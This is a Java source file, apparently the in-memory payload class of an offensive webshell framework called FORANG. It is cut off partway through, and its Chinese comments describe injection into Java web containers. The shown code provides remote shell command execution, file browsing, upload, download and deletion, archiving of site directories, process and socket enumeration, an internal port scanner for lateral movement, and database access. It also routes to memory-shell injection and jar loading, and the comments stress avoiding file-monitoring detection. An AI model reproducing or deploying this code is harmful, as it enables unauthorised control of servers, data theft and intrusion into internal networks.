package forang;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Map;
import java.util.TreeMap;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * FORANG Java 动态载荷。
 *
 * <p>设计约束：
 * <ul>
 *   <li>只用 JDK 8 API —— 目标端从 JDK 6 到 21 都可能，编译时用 {@code --release 8}
 *       产出 52.0 字节码，覆盖绝大多数现网 Web 容器；</li>
 *   <li>不引用任何第三方库，整个类只有 JDK 自带依赖，defineClass 后可直接反射调用；</li>
 *   <li>入口只有一个静态方法 {@link #run(String, String[])}，返回文本，错误以
 *       {@code ERROR:} 开头，与平台既有 Parse 约定一致；</li>
 *   <li>进程输出用平台默认编码解码成 String（Windows 是 GBK、Linux 是 UTF-8），
 *       由调用方统一按 UTF-8 回写，避免中文在传输层二次损坏；</li>
 *   <li>回显格式必须和脚本载体一致：{@code list} 出 JSON 数组、{@code read} 出 base64、
 *       其余出 {@code OK}。前端文件面板按这套约定解析，两端不一致就会「目录解析失败」。</li>
 * </ul>
 *
 * <p>这里不落盘、不写临时文件：所有操作在内存里完成，减少被文件监控发现的机会
 * （文件写操作是用户显式要求的，自然除外）。
 */
public final class Payload implements java.lang.reflect.InvocationHandler {

    /** 存活探测标记，必须与 Go 侧 webshell.PongMarker 完全一致。 */
    private static final String PONG = "__WS_PONG__";

    /** 工作目录标记，必须与 Go 侧 webshell.CWDMarker 完全一致。 */
    private static final String CWD = "__WS_CWD__";

    /** 单次读文件上限，避免一次把内存撑爆（前端预览也用不到这么大）。 */
    private static final int MAX_READ = 8 * 1024 * 1024;

    /** 载体注入的 ServletContext；只有 JSP 上下文里才有，内存马操作依赖它。 */
    private static volatile Object sApp;

    /** 内存马触发条件（实例字段：一个 Filter 实例一套）。 */
    private String gateHeader;
    private String gateValue;
    private String cmdParam;

    /** 供内存马新建实例用（Proxy 的 InvocationHandler 必须是对象）。 */
    public Payload() {
    }

    /**
     * 载体每请求调用一次，把 request / application 交给载荷。
     * 直接用 Object 接收，避免在字节码里写死 javax 或 jakarta 类型。
     */
    public static void attach(Object request, Object app) {
        sApp = app;
    }

    /** 统一入口。op 为操作名，args 为参数，返回值直接回显。 */
    public static String run(String op, String[] args) {
        try {
            if ("exec".equals(op)) {
                return exec(args);
            }
            if ("info".equals(op)) {
                return info();
            }
            if ("ping".equals(op)) {
                return PONG;
            }
            if ("list".equals(op)) {
                return list(arg(args, 0));
            }
            if ("read".equals(op)) {
                return read(arg(args, 0));
            }
            if ("write".equals(op)) {
                // 第三个参数为 "b64" 时按 base64 解码写入，用于二进制上传
                boolean binary = "b64".equals(arg(args, 2));
                return write(arg(args, 0), arg(args, 1), binary);
            }
            if ("delete".equals(op)) {
                return delete(arg(args, 0));
            }
            if ("rename".equals(op)) {
                return rename(arg(args, 0), arg(args, 1));
            }
            if ("mkdir".equals(op)) {
                return mkdir(arg(args, 0));
            }
            if ("zip".equals(op)) {
                return zip(arg(args, 0), arg(args, 1));
            }
            if ("unzip".equals(op)) {
                return unzip(arg(args, 0), arg(args, 1));
            }
            if ("memshell_probe".equals(op)) {
                return msProbe();
            }
            if ("memshell_inject".equals(op)) {
                return msInject(arg(args, 0), arg(args, 1), arg(args, 2), arg(args, 3));
            }
            if ("memshell_list".equals(op)) {
                return msList();
            }
            if ("memshell_remove".equals(op)) {
                return msRemove(arg(args, 0));
            }
            if ("proc".equals(op)) {
                return proc(arg(args, 0), arg(args, 1));
            }
            if ("net".equals(op)) {
                return net(arg(args, 0), arg(args, 1), arg(args, 2));
            }
            if ("db".equals(op)) {
                return db(arg(args, 0), arg(args, 1), arg(args, 2), arg(args, 3),
                        arg(args, 4), arg(args, 5), arg(args, 6), arg(args, 7));
            }
            if ("servlets".equals(op)) {
                return servletList();
            }
            if ("jarload".equals(op)) {
                return jarLoad(arg(args, 0), arg(args, 1));
            }
            if ("shot".equals(op)) {
                return screenshot();
            }
            return "ERROR:unknown op: " + op;
        } catch (Throwable t) {
            String msg = t.getMessage();
            return "ERROR:" + t.getClass().getSimpleName() + (msg == null ? "" : ": " + msg);
        }
    }

    /** 命令执行：Windows 走 cmd /c，其余走 /bin/sh -c；stderr 合并进 stdout。 */
    private static String exec(String[] args) throws IOException, InterruptedException {
        if (args == null || args.length == 0 || args[0] == null || args[0].length() == 0) {
            return "ERROR:missing command";
        }
        String os = System.getProperty("os.name", "").toLowerCase();
        boolean win = os.indexOf("win") >= 0;
        String cmd = args[0];
        String dir = System.getProperty("user.dir", "");
        // 第二个参数可选：工作目录。用 cd 前缀而不是 ProcessBuilder.directory()——
        // 后者只影响子进程初始目录，命令里的相对路径语义不变，但目录不存在时会直接
        // 抛 IOException，拿不到「shell 报错」这种更有用的回显。
        if (args.length > 1 && args[1] != null && args[1].length() > 0) {
            cmd = (win ? "cd /d \"" : "cd \"") + args[1] + "\" && " + cmd;
            dir = args[1];
        }
        String[] argv = win
                ? new String[]{"cmd.exe", "/c", cmd}
                : new String[]{"/bin/sh", "-c", cmd};

        ProcessBuilder pb = new ProcessBuilder(argv);
        // 必须合并 stderr：否则错误流写满管道缓冲区会让进程卡死（大输出尤其明显）
        pb.redirectErrorStream(true);
        Process p = pb.start();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        copy(p.getInputStream(), out);
        int code = p.waitFor();

        String text = new String(out.toByteArray());
        if (text.length() == 0 && code != 0) {
            return "ERROR:exit code " + code;
        }
        // 回带工作目录：平台按 CWDMarker 切分，前端命令面板据此更新当前路径
        return text + CWD + dir;
    }

    /** 目录列表，回显 JSON 数组，字段与脚本载体一致：name/size/is_dir/mtime。 */
    private static String list(String path) {
        File dir = new File(path == null || path.length() == 0
                ? System.getProperty("user.dir", ".") : path);
        if (!dir.exists()) {
            return "ERROR:路径不存在: " + dir.getPath();
        }
        File[] files = dir.listFiles();
        if (files == null) {
            return "ERROR:无法列出目录（权限不足或不是目录）: " + dir.getPath();
        }
        // 不排序：排序需要 Comparator，匿名内部类会多编出一个 forang/Payload$1.class，
        // 而载体只 defineClass 主类，目标端会 NoClassDefFoundError。前端本来就按
        // is_dir + name 排，这里保持原始顺序即可。
        StringBuilder sb = new StringBuilder("[");
        for (int i = 0; i < files.length; i++) {
            File f = files[i];
            if (i > 0) {
                sb.append(',');
            }
            sb.append("{\"name\":").append(json(f.getName()))
                    .append(",\"size\":").append(f.length())
                    .append(",\"is_dir\":").append(f.isDirectory())
                    .append(",\"mtime\":").append(f.lastModified() / 1000)
                    .append('}');
        }
        return sb.append(']').toString();
    }

    /** 读文件，回显 base64（与脚本载体一致，二进制也安全）。 */
    private static String read(String path) throws IOException {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (!f.exists() || !f.isFile()) {
            return "ERROR:文件不存在: " + path;
        }
        if (!f.canRead()) {
            return "ERROR:无读取权限: " + path;
        }
        if (f.length() > MAX_READ) {
            return "ERROR:文件过大（" + f.length() + " 字节，上限 " + MAX_READ + "），请用命令执行分块导出";
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream((int) Math.max(64, f.length()));
        FileInputStream in = new FileInputStream(f);
        try {
            copy(in, out);
        } finally {
            in.close();
        }
        return b64(out.toByteArray());
    }

    /** 写文件：binary=true 时按 base64 解码后写入，否则按文本 UTF-8 写入。 */
    private static String write(String path, String content, boolean binary) throws IOException {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            return "ERROR:无法创建父目录: " + parent.getPath();
        }
        byte[] data = content == null
                ? new byte[0]
                : (binary ? unb64(content) : content.getBytes("UTF-8"));
        FileOutputStream out = new FileOutputStream(f);
        try {
            out.write(data);
        } finally {
            out.close();
        }
        return "OK";
    }

    private static String delete(String path) {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (!f.exists()) {
            return "ERROR:路径不存在: " + path;
        }
        if (!deleteRec(f)) {
            return "ERROR:删除失败（权限不足或目录非空）: " + path;
        }
        return "OK";
    }

    private static boolean deleteRec(File f) {
        if (f.isDirectory()) {
            File[] kids = f.listFiles();
            if (kids != null) {
                for (File k : kids) {
                    if (!deleteRec(k)) {
                        return false;
                    }
                }
            }
        }
        return f.delete();
    }

    private static String rename(String from, String to) {
        if (from == null || from.length() == 0 || to == null || to.length() == 0) {
            return "ERROR:缺少源路径或目标路径";
        }
        File a = new File(from);
        if (!a.exists()) {
            return "ERROR:源路径不存在: " + from;
        }
        File b = new File(to);
        if (b.exists()) {
            return "ERROR:目标已存在: " + to;
        }
        if (!a.renameTo(b)) {
            return "ERROR:重命名失败（跨分区或权限不足）";
        }
        return "OK";
    }

    private static String mkdir(String path) {
        if (path == null || path.length() == 0) {
            return "ERROR:缺少路径";
        }
        File f = new File(path);
        if (f.exists()) {
            return "ERROR:路径已存在: " + path;
        }
        if (!f.mkdirs()) {
            return "ERROR:创建目录失败（权限不足）";
        }
        return "OK";
    }

    /**
     * 打包：src 可以是文件或目录，目录递归。流式写盘，不把内容读进内存。
     *
     * <p>entry 名统一用相对路径 + '/'（即便目标端是 Windows），这样同一个包
     * 在 Linux/Windows 上解出来目录结构都对得上。单个文件读失败只跳过、不中断
     * 整包——站点目录里常有被锁住的日志，为它放弃整包不值当。
     *
     * <p>回显与脚本载体对齐：成功是 {@code OK <字节数>}，失败以 ERROR: 开头。
     */
    private static String zip(String src, String dst) throws IOException {
        if (src == null || src.length() == 0 || dst == null || dst.length() == 0) {
            return "ERROR:缺少源路径或目标路径";
        }
        File in = new File(src);
        if (!in.exists()) {
            return "ERROR:源路径不存在: " + src;
        }
        File out = new File(dst);
        File parent = out.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs()) {
            return "ERROR:创建目标目录失败（权限不足）";
        }
        int[] stat = new int[]{0, 0}; // [写入成功, 跳过]
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(out));
        try {
            if (in.isDirectory()) {
                zipDir(in, in, zos, stat);
            } else {
                zipFile(in, in.getName(), zos, stat);
            }
        } finally {
            zos.close();
        }
        if (stat[0] == 0 && stat[1] == 0) {
            return "ERROR:没有可打包的文件（目录为空或不可读）: " + src;
        }
        return "OK " + out.length();
    }

    private static void zipDir(File root, File dir, ZipOutputStream zos, int[] stat) throws IOException {
        File[] kids = dir.listFiles();
        if (kids == null) {
            return; // 不可读目录：交给上层按「空包」判错
        }
        if (kids.length == 0 && !dir.getAbsolutePath().equals(root.getAbsolutePath())) {
            // 空目录也要落一条 entry，否则解包后这个目录直接消失
            zos.putNextEntry(new ZipEntry(relPath(root, dir) + "/"));
            zos.closeEntry();
            stat[0]++;
            return;
        }
        for (int i = 0; i < kids.length; i++) {
            File k = kids[i];
            if (k.isDirectory()) {
                zipDir(root, k, zos, stat);
            } else {
                zipFile(k, relPath(root, k), zos, stat);
            }
        }
    }

    private static void zipFile(File f, String name, ZipOutputStream zos, int[] stat) {
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(f);
            zos.putNextEntry(new ZipEntry(name));
            byte[] buf = new byte[8192];
            int n;
            while ((n = fis.read(buf)) > 0) {
                zos.write(buf, 0, n);
            }
            zos.closeEntry();
            stat[0]++;
        } catch (IOException e) {
            stat[1]++;
            try {
                zos.closeEntry();
            } catch (IOException ignore) {
                // 条目本身没写成功，closeEntry 再抛也只能放弃
            }
        } finally {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException ignore) {
                    // 关流失败不影响已写入的内容
                }
            }
        }
    }

    /** 相对 root 的路径，统一成 '/' 分隔；不在 root 下就退化成文件名。 */
    private static String relPath(File root, File f) {
        String base = root.getAbsolutePath();
        String full = f.getAbsolutePath();
        if (full.startsWith(base)) {
            String r = full.substring(base.length());
            while (r.startsWith("/") || r.startsWith("\\")) {
                r = r.substring(1);
            }
            return r.replace('\\', '/');
        }
        return f.getName();
    }

    /**
     * 解包到 dst（不存在就建）。
     *
     * <p>每个 entry 规范化后必须仍然落在 dst 之内，挡掉 {@code ../} 与绝对路径写法——
     * 攻击者可控的压缩包不该能往站点目录外面写文件。条目名是 GBK 时按平台默认编码
     * 猜不回来，但至少不会写错位置。
     */
    private static String unzip(String src, String dst) throws IOException {
        if (src == null || src.length() == 0 || dst == null || dst.length() == 0) {
            return "ERROR:缺少源路径或目标路径";
        }
        File in = new File(src);
        if (!in.isFile()) {
            return "ERROR:压缩包不存在: " + src;
        }
        File out = new File(dst);
        if (!out.exists() && !out.mkdirs()) {
            return "ERROR:创建解压目录失败（权限不足）";
        }
        String baseCanon = out.getCanonicalPath();
        String prefix = baseCanon.endsWith(File.separator) ? baseCanon : baseCanon + File.separator;
        int ok = 0;
        int skip = 0;
        ZipInputStream zis = new ZipInputStream(new FileInputStream(in));
        try {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                String name = e.getName() == null ? "" : e.getName().replace('\\', '/');
                if (name.length() == 0) {
                    skip++;
                    continue;
                }
                File target = new File(out, name);
                String canon = target.getCanonicalPath();
                if (!canon.equals(baseCanon) && !canon.startsWith(prefix)) {
                    skip++; // Zip Slip：写出 dst 之外，直接丢弃
                    continue;
                }
                if (e.isDirectory()) {
                    if (!target.exists()) {
                        target.mkdirs();
                    }
                } else {
                    File p = target.getParentFile();
                    if (p != null && !p.exists()) {
                        p.mkdirs();
                    }
                    FileOutputStream fos = new FileOutputStream(target);
                    try {
                        byte[] buf = new byte[8192];
                        int n;
                        while ((n = zis.read(buf)) > 0) {
                            fos.write(buf, 0, n);
                        }
                    } finally {
                        fos.close();
                    }
                    ok++;
                }
                zis.closeEntry();
            }
        } finally {
            zis.close();
        }
        if (ok == 0 && skip == 0) {
            // 空包与「根本不是一个 zip」在 ZipInputStream 眼里都是「没有下一个 entry」，
            // 分开不了就一起说清楚，免得回一个 OK 0 让人以为解成功了
            return "ERROR:压缩包里没有条目（空包或不是有效 zip）: " + src;
        }
        return "OK " + ok + (skip > 0 ? " (跳过 " + skip + " 个异常条目)" : "");
    }

    /** 目标环境信息，用于连接后快速判断可用手法。 */
    private static String info() {
        Map<String, String> kv = new TreeMap<String, String>();
        kv.put("os.name", System.getProperty("os.name", ""));
        kv.put("os.version", System.getProperty("os.version", ""));
        kv.put("os.arch", System.getProperty("os.arch", ""));
        kv.put("java.version", System.getProperty("java.version", ""));
        kv.put("java.vendor", System.getProperty("java.vendor", ""));
        kv.put("user.name", System.getProperty("user.name", ""));
        kv.put("user.dir", System.getProperty("user.dir", ""));
        kv.put("user.home", System.getProperty("user.home", ""));
        kv.put("file.encoding", System.getProperty("file.encoding", ""));
        kv.put("java.io.tmpdir", System.getProperty("java.io.tmpdir", ""));
        kv.put("classpath", System.getProperty("java.class.path", ""));
        kv.put("hostname", hostname());
        // 以下三项决定「能不能更进一步」：内存马要 attach 能力、提权要看运行账号
        kv.put("available.processors", String.valueOf(Runtime.getRuntime().availableProcessors()));
        kv.put("max.memory.mb", String.valueOf(Runtime.getRuntime().maxMemory() / 1048576L));
        kv.put("cwd.writable", String.valueOf(new File(System.getProperty("user.dir", ".")).canWrite()));

        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : kv.entrySet()) {
            sb.append(e.getKey()).append('=').append(e.getValue()).append('\n');
        }
        return sb.toString();
    }

    /** 不依赖 InetAddress 的 hostname 兜底（部分容器禁用了网络栈）。 */
    private static String hostname() {
        try {
            return java.net.InetAddress.getLocalHost().getHostName();
        } catch (Throwable ignored) {
            return System.getenv("COMPUTERNAME") != null
                    ? System.getenv("COMPUTERNAME")
                    : String.valueOf(System.getenv("HOSTNAME"));
        }
    }

    private static String arg(String[] args, int i) {
        return args != null && args.length > i ? args[i] : null;
    }

    // ---------- 进程 / 网络 / 数据库（Java 载体插件） ----------
    //
    // 脚本载体的这三个插件是「把 PHP/JS 源码丢给目标端解释器跑」；Java 载体只有字节码，
    // 必须在 JDK 自带 API 上等价重写。硬约束没变：零第三方依赖、零额外 class——
    // 任何匿名类/内部类都会多产出 Payload$N.class，而载体只 defineClass 主类。
    // 回显格式与脚本插件对齐（procs / open / columns+rows），前端面板才能一套通用。

    /** 进程列表：Linux 读 /proc（不依赖目标装没装 ps），Windows 走 tasklist。 */
    private static String proc(String mode, String filter) throws IOException, InterruptedException {
        boolean win = System.getProperty("os.name", "").toLowerCase().indexOf("win") >= 0;
        // 外层结构与脚本插件一致：{"os":"linux","procs":[...]}，前端面板才不用分载体写两套
        StringBuilder sb = new StringBuilder("{\"os\":").append(json(win ? "win" : "linux"))
                .append(",\"procs\":[");
        // 上限只在「没给过滤词」时生效：带过滤词说明是在具体找进程（比如定位 tomcat 的
        // pid），此时必须扫完全部条目——按 /proc 的枚举顺序，目标进程很可能排在 500 名开外，
        // 早期固定 500 条上限会出现「进程明明在跑却搜不到」的假阴性。
        boolean filtered = filter != null && filter.trim().length() > 0;
        int cap = filtered ? 1000 : 500;
        int n = 0;
        if (win) {
            String out = execText("tasklist /fo csv /nh");
            String[] lines = out.split("\n");
            for (int i = 0; i < lines.length && n < cap; i++) {
                String line = lines[i].trim();
                if (line.length() == 0) {
                    continue;
                }
                // "chrome.exe","1234","Console","1","123,456 K"
                String[] f = line.split("\",\"");
                if (f.length < 2) {
                    continue;
                }
                String name = f[0].replace("\"", "");
                String pid = f[1].replace("\"", "");
                String mem = f.length > 4 ? f[4].replace("\"", "") : "";
                if (!hit(pid, name, filter)) {
                    continue;
                }
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"pid\":").append(num(pid)).append(",\"name\":").append(json(name))
                        .append(",\"user\":\"\",\"state\":\"running\",\"mem\":").append(json(mem)).append('}');
            }
        } else {
            String[] entries = new File("/proc").list();
            Map<String, String> users = passwd();
            for (int i = 0; entries != null && i < entries.length && n < cap; i++) {
                String d = entries[i];
                if (!digits(d)) {
                    continue;
                }
                String cmdline = readText(new File("/proc/" + d + "/cmdline"), 8192).replace('\0', ' ').trim();
                String status = readText(new File("/proc/" + d + "/status"), 8192);
                String name = statusField(status, "Name:");
                String uid = statusField(status, "Uid:");
                String cmd = cmdline.length() > 0 ? cmdline : "[" + name + "]";
                if (!hit(d, cmd + " " + name, filter)) {
                    continue;
                }
                String who = users.get(uid);
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"pid\":").append(num(d)).append(",\"name\":").append(json(name))
                        .append(",\"user\":").append(json(who == null ? uid : who))
                        .append(",\"state\":").append(json(statusField(status, "State:")))
                        .append(",\"cmd\":").append(json(clip(cmd, 400))).append('}');
            }
        }
        return sb.append("]}").toString();
    }

    /**
     * 网络：mode=list 列本机 TCP 连接（Linux 读 /proc/net/tcp，Windows 走 netstat -ano）；
     * mode=scan 从目标侧发起 connect 扫描，是这批插件里最实用的内网入口。
     */
    private static String net(String mode, String host, String ports) throws Exception {
        if ("scan".equals(mode)) {
            return netScan(host, ports);
        }
        boolean win = System.getProperty("os.name", "").toLowerCase().indexOf("win") >= 0;
        StringBuilder sb = new StringBuilder("[");
        int n = 0;
        if (win) {
            String[] lines = execText("netstat -ano").split("\n");
            for (int i = 0; i < lines.length && n < 800; i++) {
                String[] f = splitWS(lines[i]);
                if (f.length < 5 || !"TCP".equalsIgnoreCase(f[0])) {
                    continue;
                }
                if (n++ > 0) {
                    sb.append(',');
                }
                sb.append("{\"proto\":\"tcp\",\"local\":").append(json(f[1]))
                        .append(",\"remote\":").append(json(f[2]))
                        .append(",\"state\":").append(json(f[3]))
                        .append(",\"uid\":\"\",\"pid\":").append(num(f[4])).append('}');
            }
        } else {
            String[] files = new String[]{"/proc/net/tcp", "/proc/net/tcp6"};
            for (int k = 0; k < files.length; k++) {
                String body = readText(new File(files[k]), 512 * 1024);
                if (body.length() == 0) {
                    continue;
                }
                String[] lines = body.split("\n");
                for (int i = 1; i < lines.length && n < 800; i++) {
                    String[] f = splitWS(lines[i]);
                    if (f.length < 10) {
                        continue;
                    }
                    if (n++ > 0) {
                        sb.append(',');
                    }
                    sb.append("{\"proto\":\"tcp\",\"local\":").append(json(hexAddr(f[1])))
                            .append(",\"remote\":").append(json(hexAddr(f[2])))
                            .append(",\"state\":").append(json(stateName(f[3])))
                            .append(",\"uid\":").append(json(f[7]))
                            .append(",\"inode\":").append(json(f[9])).append('}');
                }
            }
        }
        return sb.append(']').toString();
    }

    /**
     * connect 扫描：非阻塞 SocketChannel + Selector，一次挂上几百个目标再统一收口。
     * 不用线程池是因为任务体必须是类（Runnable 实现类会多产 class 文件），
     * NIO 这套纯 JDK 自带，且不占线程。
     */
    private static String netScan(String host, String ports) throws IOException {
        ArrayList<Integer> want = new ArrayList<Integer>();
        String[] items = ports == null ? new String[0] : ports.split(",");
        for (int i = 0; i < items.length && want.size() < 300; i++) {
            String s = items[i].trim();
            int dash = s.indexOf('-');
            try {
                if (dash > 0) {
                    int lo = Integer.parseInt(s.substring(0, dash).trim());
                    int hi = Integer.parseInt(s.substring(dash + 1).trim());
                    for (int p = lo; p <= hi && p <= 65535 && want.size() < 300; p++) {
                        want.add(Integer.valueOf(p));
                    }
                } else if (s.length() > 0) {
                    int p = Integer.parseInt(s);
                    if (p > 0 && p <= 65535) {
                        want.add(Integer.valueOf(p));
                    }
                }
            } catch (Throwable ignored) {
                // 单个端口写错就跳过，不整体失败
            }
        }
        StringBuilder sb = new StringBuilder("{\"host\":").append(json(host)).append(",\"open\":[");
        Selector sel = Selector.open();
        ArrayList<SocketChannel> chans = new ArrayList<SocketChannel>();
        ArrayList<Integer> open = new ArrayList<Integer>();
        long deadline = System.currentTimeMillis() + 8000L;
        try {
            for (int i = 0; i < want.size(); i++) {
                SocketChannel sc = null;
                try {
                    sc = SocketChannel.open();
                    sc.configureBlocking(false);
                    sc.connect(new InetSocketAddress(host, want.get(i).intValue()));
                    sc.register(sel, SelectionKey.OP_CONNECT, want.get(i));
                    chans.add(sc);
                } catch (Throwable t) {
                    if (sc != null) {
                        try {
                            sc.close();
                        } catch (Throwable ignored) {
                            // 关不掉也无所谓，进程退出会回收
                        }
                    }
                }
            }
            int remaining = chans.size();
            while (remaining > 0) {
                long left = deadline - System.currentTimeMillis();
                if (left <= 0) {
                    break;
                }
                sel.select(left > 300 ? 300 : left);
                java.util.Iterator<SelectionKey> it = sel.selectedKeys().iterator();
                while (it.hasNext()) {
                    SelectionKey k = it.next();
                    it.remove();
                    remaining--;
                    try {
                        SocketChannel sc = (SocketChannel) k.channel();
                        if (sc.finishConnect()) {
                            open.add((Integer) k.attachment());
                        }
                    } catch (Throwable ignored) {
                        // 连接被拒/超时：不是开放端口
                    }
                    k.cancel();
                    try {
                        k.channel().close();
                    } catch (Throwable ignored) {
                        // 同上
                    }
                }
            }
        } finally {
            try {
                sel.close();
            } catch (Throwable ignored) {
                // 同上
            }
            for (int i = 0; i < chans.size(); i++) {
                try {
                    chans.get(i).close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
        }
        java.util.Collections.sort(open);
        for (int i = 0; i < open.size(); i++) {
            if (i > 0) {
                sb.append(',');
            }
            sb.append(open.get(i));
        }
        return sb.append("]}").toString();
    }

    /**
     * 数据库：JDBC 直连 + 执行 SQL，输出与脚本插件同构的 {ok,columns,rows,affected}。
     * 与脚本载体的关键差别——驱动必须已经在目标 classpath 上（脚本载体是把驱动塞进 payload，
     * Java 载体做不到），所以驱动缺失时直接回 ERROR 并给出可操作的建议。
     */
    private static String db(String type, String host, String port, String user, String pass,
            String dbname, String sql, String jar) {
        if (type == null || type.length() == 0) {
            type = "mysql";
        }
        if ("drivers".equals(type) || "probe".equals(type)) {
            return dbDrivers();
        }
        String[] drivers = driversFor(type);
        String loaded = null;
        StringBuilder tried = new StringBuilder();
        for (int i = 0; i < drivers.length; i++) {
            try {
                Class.forName(drivers[i]);
                loaded = drivers[i];
                break;
            } catch (Throwable t) {
                if (tried.length() > 0) {
                    tried.append(',');
                }
                tried.append(drivers[i]);
            }
        }
        // classpath 上没有，但给了 jar 路径（jarload 上传过的，或目标机上现成的驱动包）：
        // 这种驱动不在容器 classpath 里，DriverManager.getConnection 认不到它——
        // registerDriver 会按「调用者类加载器能不能看见驱动类」校验，跨 loader 一律拒绝。
        // 所以这里绕过 DriverManager，直接拿 Driver 实例 connect。
        Driver direct = null;
        if (loaded == null && jar != null && jar.trim().length() > 0) {
            String jarPath = jar.trim();
            String reason = null;
            try {
                ClassLoader jarLdr = loaderFor(jarPath);
                for (int i = 0; i < drivers.length && direct == null; i++) {
                    try {
                        Object inst = Class.forName(drivers[i], true, jarLdr).newInstance();
                        if (inst instanceof Driver) {
                            direct = (Driver) inst;
                            loaded = drivers[i] + "@" + jarPath;
                        }
                    } catch (Throwable t) {
                        // 记下原因再换下一个类名。最常见的不是「包不对」而是「包缺依赖」——
                        // 例如 sqlite-jdbc 静态块里要用 slf4j，只回一句「没找到驱动」会让人
                        // 以为文件传错了，实际要再补一个依赖包。
                        String m = t.getMessage();
                        reason = t.getClass().getSimpleName() + (m == null ? "" : ": " + m);
                    }
                }
                if (direct == null) {
                    return "ERROR:" + jarPath + " 里没找到 " + type + " 的驱动（试过 " + tried
                            + "）" + (reason == null ? "" : "；最后一个错误：" + reason)
                            + "。如果错误是 NoClassDefFoundError，说明包缺依赖，"
                            + "把它依赖的 jar 也 jarload 上去，然后 jar 参数里用逗号分隔多个路径。";
                }
            } catch (Throwable t) {
                String m = t.getMessage();
                return "ERROR:加载 " + jarPath + " 失败：" + t.getClass().getSimpleName()
                        + (m == null ? "" : ": " + m);
            }
        }
        if (loaded == null) {
            return "ERROR:目标 classpath 上没有 " + type + " 的 JDBC 驱动（试过 " + tried
                    + "）。脚本载体能连是因为驱动被塞进了 payload；Java 载体只能用目标已有的 jar——"
                    + "先 jarload 上传驱动包（会回可用路径），再把路径填到 db 的 jar 参数；"
                    + "或者直接用目标机上的驱动 jar 文件路径。";
        }
        Connection conn = null;
        Statement st = null;
        ResultSet rs = null;
        long t0 = System.currentTimeMillis();
        try {
            try {
                DriverManager.setLoginTimeout(10);
            } catch (Throwable ignored) {
                // 老驱动不实现，无碍
            }
            String url = jdbcURL(type, host, port, dbname);
            if (direct != null) {
                java.util.Properties props = new java.util.Properties();
                if (user != null) {
                    props.setProperty("user", user);
                }
                if (pass != null) {
                    props.setProperty("password", pass);
                }
                conn = direct.connect(url, props);
                if (conn == null) {
                    return "ERROR:驱动 " + loaded + " 不接受 " + url + "（acceptsURL=false，检查库类型/URL 格式）";
                }
            } else {
                conn = DriverManager.getConnection(url,
                        user == null ? "" : user, pass == null ? "" : pass);
            }
            st = conn.createStatement();
            try {
                st.setQueryTimeout(30);
            } catch (Throwable ignored) {
                // 同上
            }
            StringBuilder sb = new StringBuilder("{\"ok\":true");
            boolean has = st.execute(sql);
            if (has) {
                rs = st.getResultSet();
                ResultSetMetaData md = rs.getMetaData();
                int cols = md.getColumnCount();
                String[] names = new String[cols + 1];
                sb.append(",\"columns\":[");
                for (int i = 1; i <= cols; i++) {
                    names[i] = md.getColumnLabel(i);
                    if (names[i] == null || names[i].length() == 0) {
                        names[i] = md.getColumnName(i);
                    }
                    if (i > 1) {
                        sb.append(',');
                    }
                    sb.append(json(names[i]));
                }
                sb.append("],\"rows\":[");
                int rows = 0;
                while (rs.next() && rows < 300) {
                    if (rows++ > 0) {
                        sb.append(',');
                    }
                    sb.append('{');
                    for (int i = 1; i <= cols; i++) {
                        if (i > 1) {
                            sb.append(',');
                        }
                        sb.append(json(names[i])).append(':');
                        String v = clip(rs.getString(i), 500);
                        // null 原样输出为 JSON null：前端表格里能看出「这格是 NULL」
                        if (v == null) {
                            sb.append("null");
                        } else {
                            sb.append(json(v));
                        }
                    }
                    sb.append('}');
                }
                sb.append("],\"affected\":").append(rows);
            } else {
                sb.append(",\"columns\":[],\"rows\":[],\"affected\":").append(st.getUpdateCount());
            }
            sb.append(",\"driver\":").append(json(loaded))
                    .append(",\"elapsed_ms\":").append(System.currentTimeMillis() - t0).append('}');
            return sb.toString();
        } catch (Throwable t) {
            String msg = t.getMessage();
            return "ERROR:db:" + t.getClass().getSimpleName() + (msg == null ? "" : ": " + msg);
        } finally {
            if (rs != null) {
                try {
                    rs.close();
                } catch (Throwable ignored) {
                    // 关闭失败不影响结果
                }
            }
            if (st != null) {
                try {
                    st.close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                } catch (Throwable ignored) {
                    // 同上
                }
            }
        }
    }

    /** 探测目标 classpath 上到底有哪些 JDBC 驱动，决定「能不能直连」而不是靠猜。 */
    private static String dbDrivers() {
        String[] types = new String[]{"mysql", "pgsql", "sqlite", "sqlserver", "oracle"};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < types.length; i++) {
            String[] ds = driversFor(types[i]);
            for (int j = 0; j < ds.length; j++) {
                boolean ok;
                try {
                    Class.forName(ds[j]);
                    ok = true;
                } catch (Throwable t) {
                    ok = false;
                }
                if (ok) {
                    sb.append(types[i]).append(" -> ").append(ds[j]).append('\n');
                    break;
                }
            }
        }
        if (sb.length() == 0) {
            sb.append("未发现任何 JDBC 驱动（mysql/pgsql/sqlite/sqlserver/oracle 全部缺失）\n");
        }
        String cp = System.getProperty("java.class.path", "");
        sb.append("classpath=").append(clip(cp, 300));
        return sb.toString();
    }

    private static String[] driversFor(String type) {
